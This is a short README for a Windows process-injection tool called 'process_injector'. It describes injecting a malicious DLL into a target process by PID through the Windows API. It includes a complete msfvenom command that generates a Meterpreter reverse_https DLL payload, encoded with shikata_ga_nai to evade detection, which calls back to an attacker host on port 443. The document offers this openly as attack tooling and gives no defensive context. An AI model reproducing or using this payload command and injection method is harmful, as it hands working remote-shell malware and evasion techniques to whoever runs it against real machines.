# process_injector

This program is made completely using winAPI to inject malicios dll file into a process using its PID (Process ID).

You can use Metasploit to generate a malicious dll using msfvenom-

msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.8 lport=443 -e x86/shikata_ga_nai -f dll --platform win -a x86 > test.dll

You can find PID of a program using Task Manager.

